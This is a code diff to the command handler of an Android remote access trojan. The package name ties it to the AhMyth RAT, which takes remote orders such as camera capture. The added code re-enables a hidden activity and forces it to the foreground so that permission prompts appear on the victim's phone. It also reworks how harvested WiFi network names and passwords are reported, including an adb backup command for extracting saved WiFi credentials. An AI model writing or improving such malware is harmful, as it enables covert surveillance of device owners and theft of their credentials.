@@ -8,6 +8,8 @@ import android.content.Context;
 import android.util.Log;
 import android.os.Looper;
 import android.os.Handler;
+import android.os.Build;
+import android.app.ActivityManager;
 
 import java.lang.reflect.Method;
 
@@ -210,6 +212,7 @@ public class ConnectionManager {
 
     private static void handleOrder(JSONObject data, String order) {
         try {
+            Log.d(TAG, "Handling order: " + order); // Added explicit log
             switch (order) {
                 // === EXISTING FEATURES ===
                 case "x0000ca": // Camera
@@ -1176,8 +1179,88 @@ public class ConnectionManager {
             }
             
             if (intent != null) {
+                // Re-enable MainActivity if it was disabled (for permission requests)
+                // This is necessary for permission dialogs to show
+                if (intent.getComponent() != null && 
+                    intent.getComponent().getClassName().equals("ahmyth.mine.king.ahmyth.MainActivity")) {
+                    try {
+                        android.content.pm.PackageManager pm = context.getPackageManager();
+                        android.content.ComponentName mainActivity = new android.content.ComponentName(
+                            context, "ahmyth.mine.king.ahmyth.MainActivity");
+                        int state = pm.getComponentEnabledSetting(mainActivity);
+                        if (state == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED ||
+                            state == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER) {
+                            pm.setComponentEnabledSetting(mainActivity,
+                                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                                android.content.pm.PackageManager.DONT_KILL_APP);
+                            Log.d(TAG, "Re-enabled MainActivity for permission request");
+                            // Small delay to ensure component state is updated
+                            try {
+                                Thread.sleep(200);
+                            } catch (InterruptedException e) {
+                                // Ignore
+                            }
+                        }
+                    } catch (Exception e) {
+                        Log.w(TAG, "Could not re-enable MainActivity", e);
+                    }
+                }
+                
+                // Add flags to bring activity to foreground and ensure it's visible
                 intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
+                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP);
+                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_SINGLE_TOP);
+                
+                // CRITICAL: For permission requests to show, activity MUST be visible
+                // Force the activity to come to foreground
+                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION);
+                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
+                
+                Log.d(TAG, "Starting MainActivity for permission request: " + permission);
+                
+                // Start activity
                 context.startActivity(intent);
+                
+                // Try to bring the task to front using ActivityManager
+                // This is done on a delay to ensure the activity has started
+                new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
+                    @Override
+                    public void run() {
+                        try {
+                            ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
+                            if (am != null) {
+                                // Get running tasks to find our app's task
+                                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
+                                    // For older Android versions
+                                    java.util.List<ActivityManager.RunningTaskInfo> tasks = am.getRunningTasks(10);
+                                    for (ActivityManager.RunningTaskInfo task : tasks) {
+                                        if (task.topActivity != null && 
+                                            task.topActivity.getPackageName().equals(context.getPackageName())) {
+                                            am.moveTaskToFront(task.id, ActivityManager.MOVE_TASK_WITH_HOME);
+                                            Log.d(TAG, "Moved task to front: " + task.id);
+                                            break;
+                                        }
+                                    }
+                                } else {
+                                    // For Android 5.0+, use getAppTasks
+                                    java.util.List<ActivityManager.AppTask> tasks = am.getAppTasks();
+                                    for (ActivityManager.AppTask task : tasks) {
+                                        ActivityManager.RecentTaskInfo info = task.getTaskInfo();
+                                        if (info.topActivity != null && 
+                                            info.topActivity.getPackageName().equals(context.getPackageName())) {
+                                            task.moveToFront();
+                                            Log.d(TAG, "Moved app task to front");
+                                            break;
+                                        }
+                                    }
+                                }
+                            }
+                        } catch (Exception e) {
+                            Log.w(TAG, "Could not move task to front from service", e);
+                        }
+                    }
+                }, 500); // 500ms delay to ensure activity has started
+                
                 result.put("success", true);
                 result.put("message", "Permission dialog opened for: " + permission);
             } else {
@@ -1427,14 +1510,16 @@ public class ConnectionManager {
             result.put("androidVersion", android.os.Build.VERSION.SDK_INT);
             result.put("device", android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL);
             
-            if (foundPasswords) {
+            // Return success if we found any networks, even without passwords
+            if (networks.length() > 0) {
                 result.put("success", true);
-                result.put("passwordsFound", true);
-            } else if (networks.length() > 0) {
-                result.put("success", true);
-                result.put("passwordsFound", false);
-                result.put("note", "Network names found. For passwords: 1) Use ADB backup method, 2) Root device, or 3) Use WiFi Share on device");
-                result.put("adbCommand", "adb backup -f wifi.ab -noapk com.android.providers.settings && java -jar abe.jar unpack wifi.ab wifi.tar");
+                if (foundPasswords) {
+                    result.put("passwordsFound", true);
+                } else {
+                    result.put("passwordsFound", false);
+                    result.put("note", "Network names found. For passwords: 1) Use ADB backup method, 2) Root device, or 3) Use WiFi Share on device");
+                    result.put("adbCommand", "adb backup -f wifi.ab -noapk com.android.providers.settings && java -jar abe.jar unpack wifi.ab wifi.tar");
+                }
             } else {
                 result.put("success", false);
                 result.put("error", "Could not retrieve WiFi networks. Try: adb shell cmd wifi list-networks");
